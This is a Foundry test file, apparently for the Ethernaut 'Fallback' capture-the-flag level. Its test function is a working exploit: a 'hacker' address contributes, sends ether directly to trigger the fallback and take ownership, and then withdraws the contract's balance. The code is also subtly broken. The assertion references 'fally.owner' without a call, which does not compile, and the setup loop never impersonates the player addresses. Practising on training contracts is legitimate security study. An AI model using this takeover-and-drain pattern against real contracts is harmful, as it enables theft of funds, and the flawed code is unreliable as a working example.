// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {deployScript} from "../script/Deploy.s.sol";
import {Fallback} from "../src/fallback.sol";

contract testing is Test{
    Fallback fally;

    function setUp() public{
deployScript deployContract = new deployScript();
fally = deployContract.run();
    }

    function testDrainMoney() public{
        //Arrange
     for(uint256 i= 1; i<3;i++){
            address player = address(uint160(i));
            vm.deal(player , 10 ether);
            fally.contribute{value:0.0001 ether}();
        }
        // act
address hacker = makeAddr("Saad");

        vm.startPrank(hacker);
        vm.deal(hacker,10 ether);
        fally.contribute{value:0.0001 ether}();
       (bool success, ) = address(fally).call{value: 0.001 ether}("");
        require(success, "Low-level call failed");
        fally.withdraw();
vm.stopPrank();

// assert
assertEq(fally.owner,hacker);
        
    }
}